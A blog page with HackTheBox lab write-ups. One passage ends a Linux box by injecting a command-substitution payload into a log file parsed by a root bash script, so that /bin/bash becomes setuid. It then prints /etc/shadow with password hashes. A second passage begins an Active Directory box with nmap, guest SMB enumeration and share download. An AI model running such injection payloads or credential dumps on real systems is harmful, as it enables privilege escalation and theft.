class="built_in">echo</span> <span class="string">&quot;<span class="variable">$existing_entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f1)</span><br><span class="line">             existing_count=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$existing_entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f2)</span><br><span class="line">             <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$existing_code</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$code</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                 new_count=$((existing_count + <span class="number">1</span>))</span><br><span class="line">                 STATUS_CODES[<span class="variable">$i</span>]=<span class="string">&quot;<span class="variable">$&#123;existing_code&#125;</span>:<span class="variable">$&#123;new_count&#125;</span>&quot;</span></span><br><span class="line">                 <span class="built_in">break</span></span><br><span class="line">             <span class="keyword">fi</span></span><br><span class="line">         <span class="keyword">done</span></span><br><span class="line">     <span class="keyword">done</span> &lt; &lt;(grep <span class="string">&quot;HTTP.*Status: &quot;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="title">analyze_log_errors</span></span>()&#123;</span><br><span class="line">      <span class="comment"># Log Level Counts (colored)</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;YELLOW&#125;</span>[+] Log Level Counts:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     log_levels=$(grep -oP <span class="string">&#x27;(?&lt;=Z  )\w+&#x27;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c)</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$log_levels</span>&quot;</span> | awk -v blue=<span class="string">&quot;<span class="variable">$BLUE</span>&quot;</span> -v yellow=<span class="string">&quot;<span class="variable">$YELLOW</span>&quot;</span> -v red=<span class="string">&quot;<span class="variable">$RED</span>&quot;</span> -v reset=<span class="string">&quot;<span class="variable">$RESET</span>&quot;</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">         if ($2 == &quot;INFO&quot;) color=blue;</span></span><br><span class="line"><span class="string">         else if ($2 == &quot;WARN&quot;) color=yellow;</span></span><br><span class="line"><span class="string">         else if ($2 == &quot;ERROR&quot;) color=red;</span></span><br><span class="line"><span class="string">         else color=reset;</span></span><br><span class="line"><span class="string">         printf &quot;%s%6s %s%s\n&quot;, color, $1, $2, reset</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># ERROR Messages</span></span><br><span class="line">     error_messages=$(grep <span class="string">&#x27; ERROR &#x27;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span> | awk -F<span class="string">&#x27; ERROR &#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;RED&#125;</span>[+] ERROR Messages:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$error_messages</span>&quot;</span> | awk -v red=<span class="string">&quot;<span class="variable">$RED</span>&quot;</span> -v reset=<span class="string">&quot;<span class="variable">$RESET</span>&quot;</span> <span class="string">&#x27;&#123;print red $0 reset&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># Eureka Errors</span></span><br><span class="line">     eureka_errors=$(grep <span class="string">&#x27;Connect to http://localhost:8761.*failed: Connection refused&#x27;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line">     eureka_count=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$eureka_errors</span>&quot;</span> | <span class="built_in">wc</span> -l)</span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;YELLOW&#125;</span>[+] Eureka Connection Failures:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;YELLOW&#125;</span>Count: $eureka_count<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$eureka_errors</span>&quot;</span> | <span class="built_in">tail</span> -n 2 | awk -v yellow=<span class="string">&quot;<span class="variable">$YELLOW</span>&quot;</span> -v reset=<span class="string">&quot;<span class="variable">$RESET</span>&quot;</span> <span class="string">&#x27;&#123;print yellow $0 reset&#125;&#x27;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="title">display_results</span></span>() &#123;</span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;BLUE&#125;</span>----- Log Analysis Report -----<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># Successful logins</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;GREEN&#125;</span>[+] Successful Login Counts:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     total_success=0</span><br><span class="line">     <span class="keyword">for</span> user <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!successful_users[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">         count=<span class="variable">$&#123;successful_users[$user]&#125;</span></span><br><span class="line">         <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$&#123;GREEN&#125;</span>%6s %s<span class="variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="string">&quot;<span class="variable">$count</span>&quot;</span> <span class="string">&quot;<span class="variable">$user</span>&quot;</span></span><br><span class="line">         total_success=$((total_success + count))</span><br><span class="line">     <span class="keyword">done</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;GREEN&#125;</span>\nTotal Successful Logins: $total_success<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># Failed logins</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;RED&#125;</span>[+] Failed Login Attempts:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     total_failed=0</span><br><span class="line">     <span class="keyword">for</span> user <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!failed_users[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">         count=<span class="variable">$&#123;failed_users[$user]&#125;</span></span><br><span class="line">         <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>%6s %s<span class="variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="string">&quot;<span class="variable">$count</span>&quot;</span> <span class="string">&quot;<span class="variable">$user</span>&quot;</span></span><br><span class="line">         total_failed=$((total_failed + count))</span><br><span class="line">     <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>\nTotal Failed Login Attempts: $total_failed<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># HTTP status codes</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;CYAN&#125;</span>[+] HTTP Status Code Distribution:<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     total_requests=0</span><br><span class="line">     <span class="comment"># Sort codes numerically</span></span><br><span class="line">     IFS=$<span class="string">&#x27;\n&#x27;</span> sorted=($(<span class="built_in">sort</span> -n -t<span class="string">&#x27;:&#x27;</span> -k1 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;STATUS_CODES[*]&#125;</span>&quot;</span>))</span><br><span class="line">     <span class="built_in">unset</span> IFS</span><br><span class="line">     <span class="keyword">for</span> entry <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;sorted[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">         code=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f1)</span><br><span class="line">         count=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f2)</span><br><span class="line">         total_requests=$((total_requests + count))</span><br><span class="line"> </span><br><span class="line">         <span class="comment"># Color coding</span></span><br><span class="line">         <span class="keyword">if</span> [[ <span class="variable">$code</span> =~ ^2 ]]; <span class="keyword">then</span> color=<span class="string">&quot;<span class="variable">$GREEN</span>&quot;</span></span><br><span class="line">         <span class="keyword">elif</span> [[ <span class="variable">$code</span> =~ ^3 ]]; <span class="keyword">then</span> color=<span class="string">&quot;<span class="variable">$YELLOW</span>&quot;</span></span><br><span class="line">         <span class="keyword">elif</span> [[ <span class="variable">$code</span> =~ ^4 || <span class="variable">$code</span> =~ ^5 ]]; <span class="keyword">then</span> color=<span class="string">&quot;<span class="variable">$RED</span>&quot;</span></span><br><span class="line">         <span class="keyword">else</span> color=<span class="string">&quot;<span class="variable">$CYAN</span>&quot;</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line">         <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$&#123;color&#125;</span>%6s %s<span class="variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="string">&quot;<span class="variable">$count</span>&quot;</span> <span class="string">&quot;<span class="variable">$code</span>&quot;</span></span><br><span class="line">     <span class="keyword">done</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;CYAN&#125;</span>\nTotal HTTP Requests Tracked: $total_requests<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment"># Main execution</span></span><br><span class="line"> analyze_logins</span><br><span class="line"> analyze_http_statuses</span><br><span class="line"> display_results | <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$OUTPUT_FILE</span>&quot;</span></span><br><span class="line"> analyze_log_errors | <span class="built_in">tee</span> -a <span class="string">&quot;<span class="variable">$OUTPUT_FILE</span>&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> -e <span class="string">&quot;\n<span class="variable">$&#123;GREEN&#125;</span>Analysis completed. Results saved to $OUTPUT_FILE<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="code-injection"><a href="#code-injection" class="headerlink" title="code injection?"></a>code injection?</h3><p>在其中可以看到一个rce</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">analyze_http_statuses</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Process HTTP status codes</span></span><br><span class="line">    <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">        code=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | grep -oP <span class="string">&#x27;Status: \K.*&#x27;</span>)</span><br><span class="line">        found=0</span><br><span class="line">        <span class="comment"># Check if code exists in STATUS_CODES array</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!STATUS_CODES[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">            existing_entry=<span class="string">&quot;<span class="variable">$&#123;STATUS_CODES[$i]&#125;</span>&quot;</span></span><br><span class="line">            existing_code=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$existing_entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f1)</span><br><span class="line">            existing_count=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$existing_entry</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;:&#x27;</span> -f2)</span><br><span class="line">            <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$existing_code</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$code</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                new_count=$((existing_count + <span class="number">1</span>))</span><br><span class="line">                STATUS_CODES[<span class="variable">$i</span>]=<span class="string">&quot;<span class="variable">$&#123;existing_code&#125;</span>:<span class="variable">$&#123;new_count&#125;</span>&quot;</span></span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">done</span> &lt; &lt;(grep <span class="string">&quot;HTTP.*Status: &quot;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>analyze_http_statuses</code> 函数从 <code>$LOG_FILE</code> 中提取包含 <code>HTTP.*Status:</code> 的行，并解析 <code>Status:</code> 后的 HTTP 状态码（如 200、404）<br>它使用 grep -oP ‘Status: \K.*’ 提取状态码code<br>可以将状态码写成<code>$(command)</code><br>所以可以设计payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status: a[$(<span class="built_in">chmod</span> 4777 /bin/bash &gt;&amp;2)]+42</span><br></pre></td></tr></table></figure>
<p>先把log删了再给他写进去，反正有权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /var/www/web/user-management-service/log/application.log</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Status: a[$(chmod 4777 /bin/bash &gt;&amp;2)]+42&#x27;</span> &gt; /var/www/web/user-management-service/log/application.log</span><br><span class="line">bash -p</span><br></pre></td></tr></table></figure>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@eureka:~# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$6$OBLuDSnSI6fzrKsf<span class="variable">$u9QRtUqJYklvj0ve0W792</span>/K0OFtjkezL5d/glicQuh.wd2Zghc5DU5AR8wy3WqSN4XE4URKuT2Q.TvVn8V6aG.:19947:0:99999:7:::</span><br><span class="line">daemon:*:19430:0:99999:7:::</span><br><span class="line">bin:*:19430:0:99999:7:::</span><br><span class="line">sys:*:19430:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19430:0:99999:7:::</span><br><span class="line">games:*:19430:0:99999:7:::</span><br><span class="line">man:*:19430:0:99999:7:::</span><br><span class="line">lp:*:19430:0:99999:7:::</span><br><span class="line">mail:*:19430:0:99999:7:::</span><br><span class="line">news:*:19430:0:99999:7:::</span><br><span class="line">uucp:*:19430:0:99999:7:::</span><br><span class="line">proxy:*:19430:0:99999:7:::</span><br><span class="line">www-data:*:19430:0:99999:7:::</span><br><span class="line">backup:*:19430:0:99999:7:::</span><br><span class="line">list:*:19430:0:99999:7:::</span><br><span class="line">irc:*:19430:0:99999:7:::</span><br><span class="line">gnats:*:19430:0:99999:7:::</span><br><span class="line">nobody:*:19430:0:99999:7:::</span><br><span class="line">systemd-network:*:19430:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19430:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19430:0:99999:7:::</span><br><span class="line">messagebus:*:19430:0:99999:7:::</span><br><span class="line">syslog:*:19430:0:99999:7:::</span><br><span class="line">_apt:*:19430:0:99999:7:::</span><br><span class="line">tss:*:19430:0:99999:7:::</span><br><span class="line">uuidd:*:19430:0:99999:7:::</span><br><span class="line">tcpdump:*:19430:0:99999:7:::</span><br><span class="line">landscape:*:19430:0:99999:7:::</span><br><span class="line">pollinate:*:19430:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19430:0:99999:7:::</span><br><span class="line">usbmux:*:19917:0:99999:7:::</span><br><span class="line">sshd:*:19917:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19917::::::</span><br><span class="line">lxd:!:19917::::::</span><br><span class="line">mysql:!:19925:0:99999:7:::</span><br><span class="line">oscar190:$6$CCVgNnsseJFcoNGs<span class="variable">$gzae</span>.Om25l/QR2NNsAEeulOjuPVf.UxaTupSl.TIePjM47QM1PvPaFLY2I/BTM0kyltIHJ7MB3L8rBAnu8e501:19936:0:99999:7:::</span><br><span class="line">miranda-wise:$6<span class="variable">$cceIW</span>.FRVwHUaXms$/A4OpW8llje8ChgjPMbb81eEs.SiaivbvJyoOFtDmF9loeQ.tU3G6yMQz3B5tThwjgPr7j/XZV4TrbqQhKTif1:19936:0:99999:7:::</span><br><span class="line">_laurel:!:20188::::::</span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/">HackTheBox——Tracks AD Escape</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/escape.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-04-30 15:00:23Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn      </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:                                                                             </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57                                                                                                                                                            </span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">445/tcp   open  microsoft-ds?                                                                    </span><br><span class="line">464/tcp   open  kpasswd5?                                                                        </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback     </span><br><span class="line">| Not valid before: 2025-04-30T14:54:57</span><br><span class="line">|_Not valid after:  2055-04-30T14:54:57                                                                                                                                                            </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                        </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                                                               </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49721/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-04-30T15:01:23</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s</span><br></pre></td></tr></table></figure>
<p>先加hosts</p>
<h3 id="smb-enum"><a href="#smb-enum" class="headerlink" title="smb enum"></a>smb enum</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u anonymous -p <span class="string">&#x27;&#x27;</span></span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: (Guest)</span><br><span class="line"></span><br><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: </span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.129.228.253  445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.129.228.253  445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.129.228.253  445    DC               C$                              Default share</span><br><span class="line">SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share </span><br><span class="line">SMB         10.129.228.253  445    DC               Public          READ            </span><br><span class="line">SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share </span><br></pre></td></tr></table></figure>
<p>可以看到smb有一个<code>Public</code>和<code>IPC$</code>可读，不要急，一个一个来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\sequel.htb\\Public -U guest</span><br><span class="line">Can<span class="string">&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span></span><br><span class="line"><span class="string">Password for [WORKGROUP\guest]:</span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sat Nov 19 19:51:25 2022</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sat Nov 19 19:51:25 2022</span></span><br><span class="line"><span class="string">  SQL Server Procedures.pdf           A    49551  Fri Nov 18 21:39:43 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                5184255 blocks of size 4096. 1440326 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; prompt</span></span><br><span class="line"><span class="string">smb: \&gt; mget *</span></span><br><span class="line"><span class="string">getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (70.3 KiloBytes/sec) (average 70.3 KiloBytes/sec)</span></span><br></pre></td></tr></table></figure>
